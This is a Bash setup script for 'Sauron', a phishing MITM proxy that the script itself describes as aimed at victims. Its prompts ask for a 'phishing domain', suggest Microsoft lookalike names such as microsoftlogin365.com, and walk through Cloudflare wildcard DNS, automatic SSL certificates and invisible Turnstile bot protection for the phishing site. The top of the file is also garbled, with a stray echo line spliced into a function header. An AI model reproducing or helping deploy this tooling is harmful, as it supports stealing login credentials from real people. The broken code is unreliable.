#!/bin/bash

# Sauron Environment Configuration Manager
# Interactive setup and management of environment variables
# Compatible with Bash 3.2+

set -e

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Configuration file
ENV_FILE=".env"

echo -e "${BLUE}🔧 Sauron Environment Configuration Manager${NC}"
echo -e "${BLUE}===========================================${NC}"
# Fu        echo -e "${YELLOW}🚀 For deployment help, see: ${CYAN}https://github.com/Skillz147/Sauron-Pro#deployment${NC}"cho ""
    echo -e "${YELLOW}🚀 For deployment help, see: ${CYAN}https://github.com/Skillz147/Sauron-Pro#deployment${NC}"
    echo ""
}on to generate random secrets
generate_secret() {
    if command -v openssl >/dev/null 2>&1; then
        openssl rand -hex 32
    else
        # Fallback method
        date +%s | md5sum | head -c 32
    fi
}

# Function to get current value from .env
get_env_value() {
    local var_name="$1"
    if [ -f "$ENV_FILE" ]; then
        grep "^${var_name}=" "$ENV_FILE" 2>/dev/null | cut -d'=' -f2- | sed 's/^["'\'']//' | sed 's/["'\'']$//'
    fi
}

# Function to check if variable is set
is_var_set() {
    local var_name="$1"
    local value=$(get_env_value "$var_name")
    [ -n "$value" ]
}

# Function to mask sensitive values
mask_sensitive() {
    local var_name="$1"
    local value="$2"
    local length=${#value}
    
    if [ $length -le 8 ]; then
        echo "****"
    else
        echo "${value:0:8}..."
    fi
}

# Function to validate domain format
validate_domain() {
    local domain="$1"
    if [[ "$domain" =~ ^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$ ]]; then
        return 0
    else
        echo -e "${RED}❌ Invalid domain format. Use format: example.com${NC}"
        return 1
    fi
}

# Function to validate boolean values
validate_boolean() {
    local value="$1"
    case "$value" in
        [Tt][Rr][Uu][Ee]|[Yy][Ee][Ss]|[Yy]|1)
            echo "true"
            return 0
            ;;
        [Ff][Aa][Ll][Ss][Ee]|[Nn][Oo]|[Nn]|0|"")
            echo "false"
            return 0
            ;;
        *)
            echo -e "${RED}❌ Invalid boolean value. Use: true, false, yes, no${NC}"
            return 1
            ;;
    esac
}

# Function to show current configuration
show_configuration() {
    echo -e "${BLUE}📋 Current Configuration:${NC}"
    echo -e "${BLUE}=========================${NC}"
    echo ""
    
    # Required variables
    echo -e "${WHITE}Required Variables:${NC}"
    
    # Check SAURON_DOMAIN
    value=$(get_env_value "SAURON_DOMAIN")
    if [ -n "$value" ]; then
        echo -e "  ${GREEN}✅ SAURON_DOMAIN${NC} = $value"
        echo -e "     Your phishing domain (e.g., microsoftlogin365.com)"
    else
        echo -e "  ${RED}❌ SAURON_DOMAIN${NC} = (not set)"
        echo -e "     Your phishing domain (e.g., microsoftlogin365.com)"
    fi
    echo ""
    
    # Check CLOUDFLARE_API_TOKEN
    value=$(get_env_value "CLOUDFLARE_API_TOKEN")
    if [ -n "$value" ]; then
        masked_value=$(mask_sensitive "CLOUDFLARE_API_TOKEN" "$value")
        echo -e "  ${GREEN}✅ CLOUDFLARE_API_TOKEN${NC} = $masked_value"
        echo -e "     Cloudflare API token for automatic SSL certificates"
    else
        echo -e "  ${RED}❌ CLOUDFLARE_API_TOKEN${NC} = (not set)"
        echo -e "     Cloudflare API token for automatic SSL certificates"
    fi
    echo ""
    
    # Check TURNSTILE_SECRET
    value=$(get_env_value "TURNSTILE_SECRET")
    if [ -n "$value" ]; then
        masked_value=$(mask_sensitive "TURNSTILE_SECRET" "$value")
        echo -e "  ${GREEN}✅ TURNSTILE_SECRET${NC} = $masked_value"
        echo -e "     Cloudflare Turnstile secret key"
    else
        echo -e "  ${RED}❌ TURNSTILE_SECRET${NC} = (not set)"
        echo -e "     Cloudflare Turnstile secret key"
    fi
    echo ""
    
    # Optional variables
    echo -e "${WHITE}Optional Variables:${NC}"
    
    # Check LICENSE_TOKEN_SECRET
    value=$(get_env_value "LICENSE_TOKEN_SECRET")
    if [ -n "$value" ]; then
        masked_value=$(mask_sensitive "LICENSE_TOKEN_SECRET" "$value")
        echo -e "  ${GREEN}✅ LICENSE_TOKEN_SECRET${NC} = $masked_value"
        echo -e "     License token secret for premium features"
    else
        echo -e "  ${YELLOW}⚠️  LICENSE_TOKEN_SECRET${NC} = (using default: auto-generated)"
        echo -e "     License token secret for premium features"
    fi
    echo ""
    
    # Check DEV_MODE
    value=$(get_env_value "DEV_MODE")
    if [ -n "$value" ]; then
        echo -e "  ${GREEN}✅ DEV_MODE${NC} = $value"
        echo -e "     Development mode (true/false)"
    else
        echo -e "  ${YELLOW}⚠️  DEV_MODE${NC} = (using default: false)"
        echo -e "     Development mode (true/false)"
    fi
    echo ""
    
    # Check ADMIN_KEY
    value=$(get_env_value "ADMIN_KEY")
    if [ -n "$value" ]; then
        masked_value=$(mask_sensitive "ADMIN_KEY" "$value")
        echo -e "  ${GREEN}✅ ADMIN_KEY${NC} = $masked_value"
        echo -e "     Admin key for administrative access"
    else
        echo -e "  ${YELLOW}⚠️  ADMIN_KEY${NC} = (using default: auto-generated)"
        echo -e "     Admin key for administrative access"
    fi
    echo ""
}

# Function to validate configuration
validate_configuration() {
    echo -e "${BLUE}🔍 Validating Configuration${NC}"
    echo -e "${BLUE}===========================${NC}"
    echo ""
    
    local has_errors=false
    local missing_vars=""
    
    # Check required variables
    if ! is_var_set "SAURON_DOMAIN"; then
        missing_vars="$missing_vars SAURON_DOMAIN"
        has_errors=true
    fi
    
    if ! is_var_set "CLOUDFLARE_API_TOKEN"; then
        missing_vars="$missing_vars CLOUDFLARE_API_TOKEN"
        has_errors=true
    fi
    
    if ! is_var_set "TURNSTILE_SECRET"; then
        missing_vars="$missing_vars TURNSTILE_SECRET"
        has_errors=true
    fi
    
    if [ "$has_errors" = true ]; then
        echo -e "${RED}❌ Missing required variables:${missing_vars}${NC}"
        echo -e "${YELLOW}Run './scripts/configure-env.sh setup' to configure these variables${NC}"
        return 1
    else
        echo -e "${GREEN}✅ All required variables are set${NC}"
        echo -e "${GREEN}✅ Configuration is valid${NC}"
        return 0
    fi
}

# Function to prompt for a value
prompt_for_value() {
    local var_name="$1"
    local description="$2"
    local current_value="$3"
    local is_secret="$4"
    
    if [ -n "$current_value" ]; then
        local display_value="$current_value"
        if [ "$is_secret" = "true" ]; then
            display_value="${current_value:0:8}..."
        fi
        echo -e "${YELLOW}Current value: $display_value${NC}"
        echo -n "Keep current value? [Y/n]: "
        read -r keep_current
        case "$keep_current" in
            [Nn]|[Nn][Oo])
                current_value=""
                ;;
            *)
                echo "$current_value"
                return
                ;;
        esac
    fi
    
    echo -e "${WHITE}$description${NC}"
    echo -n "Enter $var_name: "
    if [ "$is_secret" = "true" ]; then
        read -r new_value
    else
        read -r new_value
    fi
    
    echo "$new_value"
}

# Function to interactive setup
interactive_setup() {
    echo -e "${BLUE}🔧 Interactive Environment Setup${NC}"
    echo -e "${BLUE}=================================${NC}"
    echo ""
    echo -e "${WHITE}This will guide you through configuring Sauron with the required settings.${NC}"
    echo -e "${WHITE}For detailed instructions on where to get these values, see:${NC}"
    echo -e "${CYAN}https://github.com/Skillz147/Sauron-Pro#configuration-management${NC}"
    echo ""
    echo -e "${WHITE}You will need:${NC}"
    echo -e "  ${GREEN}1.${NC} A domain name (e.g., microsoftlogin365.com)"
    echo -e "  ${GREEN}2.${NC} Cloudflare account with your domain added"
    echo -e "  ${GREEN}3.${NC} Cloudflare API token (for SSL certificates)"
    echo -e "  ${GREEN}4.${NC} Cloudflare Turnstile secret (for bot protection)"
    echo ""
    echo -e "${YELLOW}💡 Need help getting these values? Check the README for step-by-step instructions!${NC}"
    echo ""
    read -p "Press Enter to continue with configuration..." -r
    echo ""
    
    # Create temporary file for new configuration
    local temp_file="/tmp/sauron_env_$$"
    
    # Write header
    cat > "$temp_file" << EOF
# Sauron MITM Proxy Configuration
# Generated on $(date)
# Documentation: https://github.com/Skillz147/Sauron-Pro

# Required Configuration
EOF
    
    # Handle required variables
    echo -e "${WHITE}========================================${NC}"
    echo -e "${WHITE}           REQUIRED SETTINGS${NC}"
    echo -e "${WHITE}========================================${NC}"
    echo ""
    
    # SAURON_DOMAIN
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${WHITE}📌 STEP 1: Your Phishing Domain${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo -e "${WHITE}This is the domain name that victims will visit.${NC}"
    echo -e "${WHITE}Examples: ${GREEN}microsoftlogin365.com${NC}, ${GREEN}msftauthentication.com${NC}, ${GREEN}office365secure.com${NC}"
    echo ""
    echo -e "${YELLOW}Requirements:${NC}"
    echo -e "  • Purchase domain from any registrar (Namecheap, GoDaddy, etc.)"
    echo -e "  • Add domain to Cloudflare (free account)"
    echo -e "  • Set wildcard DNS: *.yourdomain.com → your server IP"
    echo ""
    current=$(get_env_value "SAURON_DOMAIN")
    while true; do
        echo ""
        echo -e "${WHITE}Enter just the domain name (e.g., microsoftlogin365.com)${NC}"
        if [ -n "$current" ]; then
            echo -e "${YELLOW}Current value: $current (press Enter to keep)${NC}"
        fi
        echo -n "Your Domain: "
        read -r value
        
        if [ -z "$value" ] && [ -n "$current" ]; then
            value="$current"
        fi
        
        if [ -z "$value" ]; then
            echo -e "${RED}❌ Domain is required${NC}"
            continue
        fi
        
        if validate_domain "$value"; then
            echo "# Your phishing domain" >> "$temp_file"
            echo "SAURON_DOMAIN=$value" >> "$temp_file"
            echo "" >> "$temp_file"
            echo -e "${GREEN}✅ Domain configured: $value${NC}"
            break
        else
            echo -e "${YELLOW}Please enter just the domain name (like: microsoftlogin365.com)${NC}"
        fi
    done
    echo ""
    
    # CLOUDFLARE_API_TOKEN
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${WHITE}📌 STEP 2: Cloudflare API Token${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo -e "${WHITE}This token allows Sauron to automatically generate SSL certificates.${NC}"
    echo ""
    echo -e "${YELLOW}How to get it:${NC}"
    echo -e "  ${GREEN}1.${NC} Go to https://dash.cloudflare.com/"
    echo -e "  ${GREEN}2.${NC} Click 'My Profile' → 'API Tokens'"
    echo -e "  ${GREEN}3.${NC} Click 'Create Token' → 'Custom token'"
    echo -e "  ${GREEN}4.${NC} Permissions: Zone:Zone:Read + Zone:DNS:Edit"
    echo -e "  ${GREEN}5.${NC} Zone Resources: Include → Specific zone → your domain"
    echo -e "  ${GREEN}6.${NC} Copy the generated token"
    echo ""
    current=$(get_env_value "CLOUDFLARE_API_TOKEN")
    while true; do
        echo ""
        echo -e "${WHITE}Paste your Cloudflare API token here${NC}"
        if [ -n "$current" ]; then
            echo -e "${YELLOW}Current value: ${current:0:8}... (press Enter to keep)${NC}"
        fi
        echo -n "Cloudflare API Token: "
        read -r value
        
        if [ -z "$value" ] && [ -n "$current" ]; then
            value="$current"
        fi
        
        if [ -z "$value" ]; then
            echo -e "${RED}❌ API token is required${NC}"
            continue
        fi
        
        echo "# Cloudflare API token for automatic SSL certificates" >> "$temp_file"
        echo "CLOUDFLARE_API_TOKEN=$value" >> "$temp_file"
        echo "" >> "$temp_file"
        echo -e "${GREEN}✅ API token configured${NC}"
        break
    done
    echo ""
    
    # TURNSTILE_SECRET
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${WHITE}📌 STEP 3: Turnstile Secret Key${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo -e "${WHITE}This provides bot protection for your phishing site.${NC}"
    echo ""
    echo -e "${YELLOW}How to get it:${NC}"
    echo -e "  ${GREEN}1.${NC} Go to https://dash.cloudflare.com/"
    echo -e "  ${GREEN}2.${NC} Select your domain"
    echo -e "  ${GREEN}3.${NC} Go to 'Security' → 'Turnstile'"
    echo -e "  ${GREEN}4.${NC} Click 'Add Site'"
    echo -e "  ${GREEN}5.${NC} Site name: 'Sauron Bot Protection'"
    echo -e "  ${GREEN}6.${NC} Domain: your domain name"
    echo -e "  ${GREEN}7.${NC} Widget type: 'Invisible'"
    echo -e "  ${GREEN}8.${NC} Copy the SECRET KEY (not Site Key!)"
    echo ""
    current=$(get_env_value "TURNSTILE_SECRET")
    while true; do
        echo ""
        echo -e "${WHITE}Paste your Turnstile SECRET KEY (not Site Key)${NC}"
        if [ -n "$current" ]; then
            echo -e "${YELLOW}Current value: ${current:0:8}... (press Enter to keep)${NC}"
        fi
        echo -n "Turnstile Secret: "
        read -r value
        
        if [ -z "$value" ] && [ -n "$current" ]; then
            value="$current"
        fi
        
        if [ -z "$value" ]; then
            echo -e "${RED}❌ Turnstile secret is required${NC}"
            continue
        fi
        
        echo "# Cloudflare Turnstile secret key" >> "$temp_file"
        echo "TURNSTILE_SECRET=$value" >> "$temp_file"
        echo "" >> "$temp_file"
        echo -e "${GREEN}✅ Turnstile secret configured${NC}"
        break
    done
    echo ""
    
    # Add optional configuration section
    echo "# Optional Configuration" >> "$temp_file"
    
    # Handle optional variables
    echo -e "${WHITE}========================================${NC}"
    echo -e "${WHITE}          OPTIONAL SETTINGS${NC}"
    echo -e "${WHITE}========================================${NC}"
    echo ""
    echo -e "${WHITE}These settings have sensible defaults. Press Enter to use defaults or type new values:${NC}"
    echo ""
    
    # LICENSE_TOKEN_SECRET
    current=$(get_env_value "LICENSE_TOKEN_SECRET")
    if [ -z "$current" ]; then
        current=$(generate_secret)
    fi
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${WHITE}License Token Secret (auto-generated if empty)${NC}"
    echo -e "${YELLOW}Current: ${current:0:8}... (press Enter to keep)${NC}"
    echo -n "LICENSE_TOKEN_SECRET: "
    read -r value
    if [ -z "$value" ]; then
        value="$current"
    fi
    echo "# License token secret for premium features" >> "$temp_file"
    echo "LICENSE_TOKEN_SECRET=$value" >> "$temp_file"
    echo "" >> "$temp_file"
    echo -e "${GREEN}✅ License token configured${NC}"
    echo ""
    
    # DEV_MODE
    current=$(get_env_value "DEV_MODE")
    if [ -z "$current" ]; then
        current="false"
    fi
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${WHITE}Development Mode (true/false)${NC}"
    echo -e "${YELLOW}Current: $current (press Enter to keep)${NC}"
    echo -n "DEV_MODE: "
    read -r value
    if [ -z "$value" ]; then
        value="$current"
    fi
    # Validate boolean
    case "$value" in
        [Tt][Rr][Uu][Ee]|[Yy][Ee][Ss]|[Yy]|1)
            value="true"
            ;;
        *)
            value="false"
            ;;
    esac
    echo "# Development mode (true/false)" >> "$temp_file"
    echo "DEV_MODE=$value" >> "$temp_file"
    echo "" >> "$temp_file"
    echo -e "${GREEN}✅ Dev mode set to: $value${NC}"
    echo ""
    
    # ADMIN_KEY
    current=$(get_env_value "ADMIN_KEY")
    if [ -z "$current" ]; then
        current=$(generate_secret)
    fi
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${WHITE}Admin Key (for administrative access)${NC}"
    echo -e "${YELLOW}Current: ${current:0:8}... (press Enter to keep)${NC}"
    echo -n "ADMIN_KEY: "
    read -r value
    if [ -z "$value" ]; then
        value="$current"
    fi
    echo "# Admin key for administrative access" >> "$temp_file"
    echo "ADMIN_KEY=$value" >> "$temp_file"
    echo "" >> "$temp_file"
    echo -e "${GREEN}✅ Admin key configured${NC}"
    echo ""
    
    # Save configuration
    mv "$temp_file" "$ENV_FILE"
    
    echo -e "${GREEN}==========================================${NC}"
    echo -e "${GREEN}🎉 CONFIGURATION COMPLETE! 🎉${NC}"
    echo -e "${GREEN}==========================================${NC}"
    echo ""
    echo -e "${GREEN}✅ Configuration saved to $ENV_FILE${NC}"
    echo ""
    echo -e "${BLUE}📋 Final Configuration Summary:${NC}"
    show_configuration
    echo ""
    echo -e "${CYAN}🚀 Next Steps:${NC}"
    echo -e "  ${GREEN}1.${NC} Run: ${WHITE}./scripts/build-release.sh${NC}"
    echo -e "  ${GREEN}2.${NC} Deploy the generated package to your server"
    echo -e "  ${GREEN}3.${NC} Run: ${WHITE}sudo ./sauron${NC} on your server"
    echo ""
    echo -e "${YELLOW}� For deployment help, see: ${CYAN}https://github.com/Skillz147/sauron#deployment${NC}"
    echo ""
}

# Function to reset configuration
reset_configuration() {
    echo -e "${RED}⚠️  Reset Configuration${NC}"
    echo -e "${RED}======================${NC}"
    echo ""
    echo -e "${YELLOW}This will delete the current .env file and all configuration.${NC}"
    echo -n "Are you sure? [y/N]: "
    read -r confirm
    
    case "$confirm" in
        [Yy]|[Yy][Ee][Ss])
            if [ -f "$ENV_FILE" ]; then
                rm "$ENV_FILE"
                echo -e "${GREEN}✅ Configuration reset${NC}"
            else
                echo -e "${YELLOW}⚠️  No configuration file found${NC}"
            fi
            ;;
        *)
            echo -e "${BLUE}ℹ️  Reset cancelled${NC}"
            ;;
    esac
}

# Main script logic
case "${1:-}" in
    "show")
        show_configuration
        ;;
    "setup")
        interactive_setup
        ;;
    "validate")
        validate_configuration
        ;;
    "reset")
        reset_configuration
        ;;
    *)
        echo -e "${YELLOW}Usage: $0 {show|setup|validate|reset}${NC}"
        echo ""
        echo -e "${WHITE}Commands:${NC}"
        echo -e "  ${GREEN}show${NC}     - Display current configuration"
        echo -e "  ${GREEN}setup${NC}    - Interactive configuration setup"
        echo -e "  ${GREEN}validate${NC} - Validate current configuration"
        echo -e "  ${GREEN}reset${NC}    - Reset/delete configuration"
        echo ""
        exit 1
        ;;
esac
